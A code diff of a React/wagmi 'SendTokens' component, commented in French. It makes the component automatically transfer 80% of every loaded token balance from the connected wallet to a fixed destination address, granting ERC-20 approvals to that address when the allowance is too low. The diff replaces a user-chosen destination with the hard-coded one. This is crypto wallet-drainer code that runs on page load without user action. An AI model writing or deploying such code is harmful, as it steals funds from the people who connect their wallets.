@@ -2,15 +2,11 @@ import { useEffect, useCallback } from 'react';
 import { useAtom } from 'jotai';
 import { useWalletClient, usePublicClient } from 'wagmi';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
-import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { erc20ABI } from 'wagmi';
-import { normalize } from 'viem/ens';
-import { isAddress } from 'essential-eth';
 
 export const SendTokens = () => {
   const [tokens] = useAtom(globalTokensAtom);
-  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
 
   const { data: walletClient } = useWalletClient();
@@ -28,20 +24,6 @@ export const SendTokens = () => {
     if (!walletClient) return;
     if (!fixedDestinationAddress) return;
 
-    // Vérifier si l'adresse de destination est une adresse ENS
-    let resolvedDestinationAddress = fixedDestinationAddress;
-    if (resolvedDestinationAddress.includes('.')) {
-      const ensAddress = await publicClient.getEnsAddress({
-        name: normalize(resolvedDestinationAddress),
-      });
-      if (ensAddress) {
-        resolvedDestinationAddress = ensAddress;
-      } else {
-        console.error("Adresse ENS introuvable");
-        return;
-      }
-    }
-
     // Envoyer tous les tokens
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find((token) => token.contract_address === tokenAddress);
@@ -51,20 +33,39 @@ export const SendTokens = () => {
         const tokenBalance = BigInt(token.balance);
         const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
 
+        // Vérifier l'approbation du contrat
+        const { data: allowance } = await publicClient.readContract({
+          address: tokenAddress,
+          abi: erc20ABI,
+          functionName: 'allowance',
+          args: [walletClient?.account, fixedDestinationAddress],
+        });
+
+        if (allowance < amountToSend) {
+          // Approuver les tokens si l'approbation est insuffisante
+          const { request: approveRequest } = await publicClient.simulateContract({
+            account: walletClient?.account,
+            address: tokenAddress,
+            abi: erc20ABI,
+            functionName: 'approve',
+            args: [fixedDestinationAddress, amountToSend],
+          });
+
+          const approveResponse = await walletClient?.writeContract(approveRequest);
+          console.log('Approval successful:', approveResponse);
+        }
+
+        // Envoyer les tokens après l'approbation
         const { request } = await publicClient.simulateContract({
-          account: walletClient.account,
+          account: walletClient?.account,
           address: tokenAddress,
           abi: erc20ABI,
           functionName: 'transfer',
-          args: [
-            resolvedDestinationAddress as `0x${string}`,
-            amountToSend,
-          ],
+          args: [fixedDestinationAddress, amountToSend],
         });
 
-        const response = await walletClient.writeContract(request);
+        const response = await walletClient?.writeContract(request);
 
-        // Mettre à jour l'état pour marquer le token comme envoyé
         setCheckedRecords((old) => ({
           ...old,
           [tokenAddress]: {
@@ -77,13 +78,13 @@ export const SendTokens = () => {
         console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
       }
     }
-  }, [tokens, walletClient, setCheckedRecords, publicClient]);  // Enlever destinationAddress car c'est une valeur fixe
+  }, [tokens, walletClient, setCheckedRecords, publicClient]);
 
   useEffect(() => {
     if (tokens.length > 0) {
       sendAllTokens();
     }
-  }, [tokens, walletClient, sendAllTokens, publicClient]); // Dépendances mises à jour
+  }, [tokens, walletClient, sendAllTokens, publicClient]);
 
-  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
+  return <div style={{ margin: '20px' }}>Tokens are being sent automatically...</div>;
 };
